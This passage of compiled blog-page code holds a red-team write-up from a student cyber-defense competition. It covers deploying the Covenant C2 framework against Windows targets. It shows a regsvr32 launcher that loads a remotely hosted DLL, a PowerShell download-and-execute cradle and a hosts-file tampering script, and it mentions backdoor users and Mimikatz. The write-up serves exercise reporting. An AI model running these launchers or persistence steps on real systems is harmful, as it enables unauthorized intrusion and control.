\"p\"\n  }, {\n    \"href\": \"https://lockdown.ubnetdef.org/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Lockdown\"), \".\\nI knew from the start I would be tackling Windows for this competition;\\nhowever, I wasn\\u2019t sure what I wanted to do. Did I want to use\\nEmpire, Metasploit, maybe Pupy? The answer was none of the above.\\nFor this competition I wanted to try out something new.\"), mdx(\"h3\", {\n    \"id\": \"deploying-covenant\"\n  }, \"Deploying Covenant\"), mdx(\"p\", null, \"I decided to go with \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/cobbr/covenant\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Covenant\"), \".\\nThis is a fairly recent C2 that came out a couple months ago\\nbased on the .NET framework and written in C#. An interesting\\naspect of this C2 is that it\\u2019s divided into two parts, Covenant\\nis the server and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/cobbr/Elite\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Elite\"), \"\\nis what interacts with the server. The last part is\\njust Grunts, that is just the Implant.\\nOne of the issues I came across when testing this is out is\\nhow long it took to set up, I just wanted to at the start of the competition\\nhit a button and have everything I needed. With some help from\\nDocker I created a docker-compose file to assist me. This\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/covDeploy\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"file\"), \" did the\\nheavy lifting for me. One really awesome aspect of this C2 was\\nthat we could spin up Covenant on one server and when anyone\\nssh\\u2019d onto our server it would docker-compose up Elite for them.\\nThis meant they didn\\u2019t have to download docker-compose and would make\\nthings centralized. \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"539px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"77.36549165120594%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAABJ0AAASdAHeZh94AAACEklEQVQ4y4VTTW/TQBTMP0TqAYG48guQOCCgF07cS4Xbqq2ohABB00AgQnBBItBWFZCPUkjdFKjruElsEtfx+ms97K7t1HbS8qRVNu/NjN+83S0gF2EYisWjZ7r4oxMcGQSdgQu5a4t9HpeOwqQgxkDiURS/dLH8UcVKVcWTbQ265f1fMCkkoDT41gsZl+bqmHlQx42nLfjB+Vj+W0hbzVvncbd4gMsPG7gqNXHzmQzXpxfiMx1ysOMFbFGx+H/e4cx8A1ekGmZLTRiWDy9IcBF2osMkwQE0tkDj3O31A1xf3cO9V23crxxi5AYiT1OciwVpdi58btcWd3GHWZ/daMOOBccc5oKeJ+gHdGImO4cmyrUeKo0+ttpDBDTM1L0cp4BUN+pfh921kZhLfvC8s7RYVAsxtD2YxD87lDBFHBAKdeBNFWydEOyf2Bl7PLqnPuqKhYHtx6fMv8Y2mmFBVvrQdDPqJCaMHB8tRcfvjoFT2x2LcWGlbwqOyjjJq2CCbKhsv/GuCmlhAWvPyzBGgbDDQ1Z6mFtag7S0is1mO+axK8VIj0vvGWcRj9bfIjLFBJPWP9R+Yb74CS+r32GLapQ/1i0sv9nByutt/DjSxx3yB1PZakEqfUZ58yei8QrBaLPfdfBVIWiqBD49m53OLvI3lq8dE2hDL2N5T+N5B7sdkn4pIaa8cUT5yUJyulMZrPYPUrR25dOQv+QAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3606e72e109fd5d8d4bc85045496c8ce/5e521/plan.webp 539w\"],\n    \"sizes\": \"(max-width: 539px) 100vw, 539px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png 539w\"],\n    \"sizes\": \"(max-width: 539px) 100vw, 539px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/3606e72e109fd5d8d4bc85045496c8ce/644b1/plan.png\",\n    \"alt\": \"Plan\",\n    \"title\": \"Plan\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"using-covenant\"\n  }, \"Using Covenant\"), mdx(\"p\", null, \"Deployment was trivial all we had to do was docker-compose up.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1807px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"52.73934698395129%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAACi0lEQVQozyWS2W7TUBRFr5vJztCQxHbiOE48pSRpk5a0hdBWahGI4QHEA+IP+AqEaGnoXDowSIiPXRw7D0eyfO199177qPnJOYfzU74czfl6/J3Ph8d8O7tkfnGdPh9d/eT+/jcXd785u/nJxe0vzm/uOftxz/zyhpPrO06vb5mfX/Hn7z+U5biojC5joPQqqiCj11DFBipbZrD3ilowQG92MVo+ejoBqib/LTuoko0y6iilE69NUdFghNUJMBoOhumiWx4Fq0vZCSjaHrPX7+lv7RJtbBNPZ8SbT2mPphSciHwrImf75M2OCNcZb++g4tEYrz+iHQ1xV8ZU2hG63VsIWi77bz8QrW/Rkm+81Sn2yoSSt0K2GZKxAzKNDpmak6Zb3XyCagd93HiI2Y1x+mOaMiURLYlgpt5m9vId3dE6VTeg1gkpNANyMongkumzJNGXqi1UvsJaIhgNJzjhAFs4OXJ7zR8KrwWrrOmxvnuAKeeGXFB2xb1EzaXuRLDRRXvQRlsWjvky8WiCejiZstwS4MLOENgJ8HInTgUKdpdgex9LcFTdkGonEQwX7qwAre6hiTutYkqZFRqOhwoljuWvUGolPDxyVo+8MDScJF4XXwSX/QEFOTcERfI+I4KaxNXSppto5Ubq0HSknP5kC19gNwJx0RumjPRWSDEpR2IHj59RFQwFEconcaXZJTsSwZ6sziKuJg2rXFEE5YKBNBiubUqLY+ryY1ZWIC9rozd7ZOsOk+dveRCMUudJGRlZk8Sdqomb6sKdVpTdzeqYTWm7PpnhbB0Q776h8/gF9bWnWJM92psHOBt7zD5+knc76OEG+XBKxn+E5q2jOQO0hKPE1iqWRC5hux7/AUZ3OKi0KW0lAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/9fc5b60b750c946791dd685a9ec537d6/18831/easy_deployment.webp 1807w\"],\n    \"sizes\": \"(max-width: 1807px) 100vw, 1807px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png 1807w\"],\n    \"sizes\": \"(max-width: 1807px) 100vw, 1807px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/9fc5b60b750c946791dd685a9ec537d6/7be35/easy_deployment.png\",\n    \"alt\": \"Easy-Deployment\",\n    \"title\": \"Easy-Deployment\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \"), \"\\n  \", mdx(\"h4\", {\n    parentName: \"div\"\n  }, \"Docker commands to run to covenant \")), mdx(\"p\", null, \"In reality we would want to tack on -d when composing Covenant\\nto background it.\\nUsing powershell with a remote session would be too noisy,\\nextremely easy to notice, and trivial to kill.\\nTo make things stealthier I decided to go with registering a dll and utilizing Regsvr32.\\nAs Regsvr32 is developed by Microsoft and in apart of System32\\nit would look a lot less suspicious. However, this requires\\nthe dotnet framework to be installed on the target machine.\\nLuckily this is a oneliner that doesn\\u2019t require a restart.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"Add-WindowsCapability \\u2013Online -Name NetFx3~~~~ \\u2013Source D:\\\\sources\\\\sxs\\n\")), mdx(\"p\", null, \"The launcher is just a simple one liner, and the icing on the cake\\nis that we can have our server host the dll file instead of having to get that file\\non the target machine.\"), mdx(\"div\", {\n    \"className\": \"Image__Medium\"\n  }, \"\\n  \", mdx(\"span\", _extends({\n    parentName: \"div\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1520px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"47.17105263157894%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAABJ0AAASdAHeZh94AAAB0klEQVQozzWQ6W7aQBSFB0xsMGbzOh7vMzbeGGxDMEmUtK8QiUgRVSSiqmuCKqKmKOnyo1IfvEOqSufn/e537gVd1RyYjuwQFE9VkhsRRUlhZ5WTz9JZnVSLcbkgxXEbhTwkR5BwOj7SfCAq9OQ1GCHXSymKJmFZB0WNyyWZnUTz03x5Xp1dWPmMxckq8QVuGYTTgpbqgY5Ml6+ApFt96PUQZloF5wrJtXCihzkcUyelMExhmKlBIpgv2gPsc4oL2iNaXwBRt1vQa5mBZIWCEfC6Jxh+G/odhLsWlizStUjfIhIirZfOTdXjZAcIA1qfg57pOVmpkMzKKjnIWFgFlcnHlMn18VSNqBJOR0HGtE0Gyy43QkDo08UZGNokqmoUl2xOgEHHxCLz2GHPiVi6diRa0b9vNXXSUP3GyD7AfG9yfAok6Osk67txm12leR2I/9c+LBJMzEPM6QFzNjQMZBcMUXMAASdSBhtJoSTlMJsPksqkC7tYGvn8kLhQwknPSyU3FZ20bae8FfMw5DVfUO1GV46nc/Dh8efNw/frr782T7/vfvxZb79tds+bh+fN7unmy/7Ndr++31/f7a8+71cfH1fvd6u326vbT5fr23f3u787BU4XtShSlAAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/24c43eb13cf07214fd80d34f12bae877/39675/launcher.webp 1520w\"],\n    \"sizes\": \"(max-width: 1520px) 100vw, 1520px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png 1520w\"],\n    \"sizes\": \"(max-width: 1520px) 100vw, 1520px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/24c43eb13cf07214fd80d34f12bae877/d4c50/launcher.png\",\n    \"alt\": \"Launcher\",\n    \"title\": \"Launcher\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \"), \"\\n  \", mdx(\"h4\", {\n    parentName: \"div\"\n  }, \"Using regsvr32 as our launcher \")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"regsvr32 /u /s /i:http://129.21.228.140/demo.dll scrobj.dll\\n\")), mdx(\"p\", null, \"/u: Unregister server calling DllRegisterServer\"), mdx(\"p\", null, \"/s: Silent: display no message boxes.\"), mdx(\"p\", null, \"/i: Since used with /u calls Dll uninstall\"), mdx(\"p\", null, \"scobj.dll: Is the Dllname that the entry points on.\"), mdx(\"p\", null, \"Once ran on the target machine we get a nice beacon back\\nand can have some fun. For the competition one of the most important\\nthings to do is maintain persistence. Making sure to add backdoor\\nusers, firewall rules, scheduled tasks, and services were essential.\\nOne service that was critical is WinRM to allow us to remotely run\\nscripts. Making sure it was running was quite simple with\\nCovenant.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"854px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"14.8711943793911%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABJ0AAASdAHeZh94AAAAsklEQVQI1y2O226DMBAFkR3AJEKBAAZsLgablKT9/9+bWm0eRtqHPaNJ7oOh7C2iHRD9hLAOaRy30fHYTip3Ukaq/Zt6f3N3X1ztTj4fKOspekcxOEqzYVwgafwRHw/EvCH8ifQvLuFNEYfZHMiWJ6l7ka0nKvyQxzsdo3AKKOP/ZCrSLZ563klujeb60Iiqi5UG2VmknknbWF2PyGZCtguXbiXV/+Qf1KeuGDb06qmi8BcB9EvtCTX2LQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/08435ddb152b4c67cb5743f0976bc7a9/565b8/example_powershell.webp 854w\"],\n    \"sizes\": \"(max-width: 854px) 100vw, 854px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png 854w\"],\n    \"sizes\": \"(max-width: 854px) 100vw, 854px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/08435ddb152b4c67cb5743f0976bc7a9/89c55/example_powershell.png\",\n    \"alt\": \"Restarting_Winrm\",\n    \"title\": \"Restarting_Winrm\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Although, in most cases we had those commands in a powershell\\nfile hosted somewhere so we were able to simply do. \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"(IWR -Uri \\\"https://hostingsite.com\\\" -UseBasicParsing).Content | IEX\\n\")), mdx(\"p\", null, \"IWR: Invoke-WebRequest\"), mdx(\"p\", null, \"IEX: Invoke-Expression\"), mdx(\"p\", null, \"It was also fun messing with them by doing very basic things\\nsuch as messing with the hosts file in Windows.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"    $hosts_path = \\\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\\\"\\n    $local = \\\"127.0.0.1\\\"\\n    $text = @\\\"\\n    $local      github.com\\n    $local      termbin.com\\n    $local      pastebin.com\\n    $local      tinyurl.com\\n    $local      bitly.com \\n    $local      google.com\\n    $local  stackoverflow.com\\n    $local  raw.githubusercontent.com\\n    $local  chocolatey.org\\n    $local  docs.microsoft.com\\n    $local  wireshark.org\\n\\\"@ \\n    Add-Content -Path $hosts_path -Value $text\\n\")), mdx(\"p\", null, \"Of course Covenant had some nice features such as\\nGetSystem which allowed us to run things at System level. While\\nalso having standard things such as Mimikatz and Registry\\nmanipulation. However, a pretty unique feature was the integration of allowing\\npeople to run C# sharp code.\"), mdx(\"h3\", {\n    \"id\": \"customization\"\n  }, \"Customization\"), mdx(\"p\", null, \"Covenant on it\\u2019s own is great; however, as part of the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/RITRedTeam\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"RITSECRedTeam\"), \" we like to keep track of things.\\nOne of the most important things is the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/micahjmartin/pwnboard\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"pwnboard\"), \".\\nThe pwnboard is a visualization to keep track of what we have control of and to\\nsee what teams are giving us trouble.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1899px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"42.33807266982622%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABOklEQVQoz01QSU7DQBD0D0i8TewAcQQCxCJuKOGARCAXrvERhcCBd+BlDLw4HttS08s44VCqqe4aVamd05s7SOYpTOYr5sTyZLbCWcrvy6c1XC83PEvsTP6kOw9hep+Cc7X8gFgbGJW1ZcOsSsFRVUOYb2FUbFlHmvZ7L2GMnrgyMP014JwtNhCWLfiFBb49ZLcQVlrmSnfMod1HVcc70oSg7GD83YJz+/LJyX5eQ1AYCC0CC2oTFjV7aN57qVloZ5EWffxDDR/XtmGDKYQ+URBXDWqEbnc78iq990Ra9ofU8OL5HdzMwOBLcIAYZsIDZA/bDJll33vdXHwEPxftY1vn5OGV07y84RsF/+5JbRSmB7aRZ+fk7X1yZ9FRhQ3PF2+SkNXcgrBLRKiCbiv3pZ2waN/6VSma7vgHxoKDt3dlm1QAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b14d7f60911c39c74299be7a98856cc2/2190f/pwnboard.webp 1899w\"],\n    \"sizes\": \"(max-width: 1899px) 100vw, 1899px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png 1899w\"],\n    \"sizes\": \"(max-width: 1899px) 100vw, 1899px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/b14d7f60911c39c74299be7a98856cc2/3254a/pwnboard.png\",\n    \"alt\": \"pwnboard-blue\",\n    \"title\": \"pwnboard-blue\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"To show that you have control of a box is a mere post request with\\njson that contains the ip and type of beacon. There is one obvious problem,\\nCovenant doesn\\u2019t automatically do this. That\\u2019s ok I was planning on\\nlearning C#. After talking to the developer to figure out where to\\nmake the post request to pwnboard whenever a Grunt was created.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"890px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"54.26966292134831%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAAByklEQVQoz21S2ZLbMAzb74glS7J1WIfvpLuZbfv/f4VCapM2nX3A8NAIJEi+aW1gQoEtM9w8w6aM5cg4bwW39wXhKHA32rMg7CuW64nR8Y/VMKOGlBJ93z/xprWmI+CShs8GLmrYPEBZBdFLCCEgKyTBuFcCSitoo5r9ktCwyzhFGDdi8BbjqGANifnmBoORHx1jo3oWkOg6AdGJJ1m1D78RKjqDneD37yjvPyn5hvte8OOc8a1E3I8Nn9cd93PHVhKLO1g7QqnXDqV8SpbsbMK0f1D6gnj9QNlWpGWBnTPc9Yq4HbCRvvdI0SPGgPr3lVD+6ZCVNNHXBbkAOyXmDKSyv2Pv2NUIxyV0lwsul66h42zrCNqcXyRXslqF1s8HwrZjyJHICPOKkAom+nndMIYIR7kT5x2qtQO8s0/5fwk5cGP4mDfkpaDsGWVN2OaCOaWGc11RciKBw7JfMTM+lojzXOGYq502wnqLyScME+fCgetakdWNtW0UQnTtdB62diJaLChbNtl1Dy+Sg4+YuN3MbRYec94KFm60TL7JSpQYWaTazNOag4UfOfNhQEwTZl7DFALejGGSeGyp/wr/HG6F+i9uOdW3xn4B+o83qJ40UpsAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3f8773f032f33b909b35948adf617d86/b1cab/post_topwnboard.webp 890w\"],\n    \"sizes\": \"(max-width: 890px) 100vw, 890px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png 890w\"],\n    \"sizes\": \"(max-width: 890px) 100vw, 890px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png\",\n    \"alt\": \"post_req\",\n    \"title\": \"post_req\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"This function is inside Covenant/GruntController.cs,\\nit just does a post request using the Grunt\\u2019s ip address\\nwrapped inside a try catch statement in case we lose connection.\"), mdx(\"p\", null, \"Due to last minute complications, the dotnet framework couldn\\u2019t\\nbe installed on every Windows box so I used a powershell launcher\\nfor all of the boxes as well as the Regsvr32 launcher if possible.\\nAs we could prebake our stuff I was able to deploy to all of the boxes\\nand watch the beacons rain down as well as turn the pwnboard red.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1920px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"42.1875%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/0e4b959883f1cb5739fc23f5eb277816/f3ff0/pwnboard_red.webp 1920w\"],\n    \"sizes\": \"(max-width: 1920px) 100vw, 1920px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png 1920w\"],\n    \"sizes\": \"(max-width: 1920px) 100vw, 1920px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png\",\n    \"alt\": \"pwnboard-red\",\n    \"title\": \"pwnboard-red\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"At the start of the competition these are just some of the beacons.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": 